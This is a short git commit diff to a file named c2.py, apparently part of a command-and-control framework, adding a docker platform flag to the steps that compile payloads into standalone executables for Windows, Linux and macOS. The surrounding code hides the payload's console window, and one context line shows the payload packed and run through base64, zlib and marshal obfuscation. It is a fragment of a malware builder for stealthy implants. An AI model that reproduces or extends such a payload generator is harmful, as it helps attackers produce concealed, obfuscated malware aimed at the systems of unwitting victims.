a9ffc2fe54cae55e0647e3fdaa3ecb92969cc814
Oz Abramovich <184321725+Dark-Avenger-Reborn@users.noreply.github.com>
2024-11-10 16:44:23 -0500

    docker added --platform

--- c2.py
+++ c2.py
@@ -182,17 +182,17 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
 
         if os_name == "Windows":
-            result = subprocess.run(f'docker run --volume "$(pwd):/src/" batonogov/pyinstaller-windows:latest "pyinstaller -F --onefile --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-windows:latest "pyinstaller -F --onefile --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
             print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
             shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
 
         elif os_name == "Linux":
-            result = subprocess.run(f'docker run --volume "$(pwd):/src/" batonogov/pyinstaller-linux:latest "pyinstaller -F --onefile --hidden-import=pty --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-linux:latest "pyinstaller -F --onefile --hidden-import=pty --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
             print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
             shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
         elif os_name == "OSX":
-            result = subprocess.run(f'docker run --volume "$(pwd):/src/" batonogov/pyinstaller-osx:latest "pyinstaller -F --onefile --hidden-import=pty --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run --platform linux/amd64 --volume "$(pwd):/src/" batonogov/pyinstaller-osx:latest "pyinstaller -F --onefile --hidden-import=pty --hide-console hide-early {payload_file_name}.py"', shell=True, capture_output=True)
             print(result.stdout.decode(), result.stderr.decode())  # Print output for debugging
             shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
